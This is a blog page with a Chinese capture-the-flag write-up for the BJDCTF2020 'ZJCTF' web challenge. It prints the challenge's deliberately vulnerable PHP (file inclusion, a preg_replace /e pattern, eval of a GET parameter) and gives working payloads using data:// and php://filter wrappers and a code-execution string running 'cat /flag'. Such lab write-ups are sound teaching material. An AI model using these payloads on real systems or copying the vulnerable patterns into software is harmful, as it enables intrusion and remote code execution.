@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>&lt;BJDCTF2020&gt;ZJCTF，不过如此 - d0ud</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="d0ud">
+    <meta property="og:title" content="&lt;BJDCTF2020&gt;ZJCTF，不过如此"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/img/bgg.png) }</style>
+    
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="d0ud" type="application/atom+xml">
+</head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>d0ud</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <!--<form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>-->
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/SQL-injection/">SQL injection</a><a class="category-link" href="/categories/another/">another</a><a class="category-link" href="/categories/authentication/">authentication</a><a class="category-link" href="/categories/code-audit/">code audit</a><a class="category-link" href="/categories/deserialize/">deserialize</a><a class="category-link" href="/categories/file-upload/">file upload</a><a class="category-link" href="/categories/pseudo-protocol/">pseudo-protocol</a>
+            </div>
+        </div>
+        
+            <a href="/friends">ctfers</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>&lt;BJDCTF2020&gt;ZJCTF，不过如此</h2>
+            <div class="post-meta">
+                <time class="date">2022.04.16</time>
+            
+                <span class="category"><a class="category-link" href="/categories/pseudo-protocol/">pseudo-protocol</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <p>打开题目，为源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//next.php</span>
+    
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>显然需要利用伪协议</p>
+<p><code>/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p>
+<p>对回显内容解码，得到</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>
+        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>
+        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
+        <span class="token variable">$str</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用<code>preg_replace/e</code>模式可执行代码的特性，传参为<code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code>，得到flag</p>
+<p>具体可参考<code>paidx0</code>师傅的博客 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49656607/article/details/119833707">https://blog.csdn.net/weixin_49656607/article/details/119833707</a></p>
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: 看完啦 (つд⊂)</li>
+                
+                
+                    <li>下一篇: <a href="/%5BMRCTF2020%5DPYWebsite/">&lt;MRCTF2020&gt;PYWebsite</a></li>
+                
+            </ul>
+        </section>
+        
+            <section class="post-tags">
+            <a class="-none-link" href="/tags/wp/" rel="tag">wp</a>
+            </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://null-d0ud.github.io/img/logo.jpg" alt="d0ud" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>d0ud</h4>
+                <p>a ctfer</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"><BJDCTF2020>ZJCTF，不过如此</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BMRCTF2020%5DPYWebsite/"><MRCTF2020>PYWebsite</a></li><li class="post-list-item"><a class="post-list-link" href="/forge%20jwt/">jwt forge</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BHFCTF2020%5DEasyLogin/"><HFCTF2020>EasyLogin</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"><GWCTF 2019>枯燥的抽奖</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BNCTF2019%5DSQLi/"><NCTF2019>SQLi</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">历史：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签：</h3>
+                    <a href="/tags/script/" style="font-size: 10px;">script</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2022 <a href="/">d0ud</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":false});</script>
+
+  </body>
+</html>
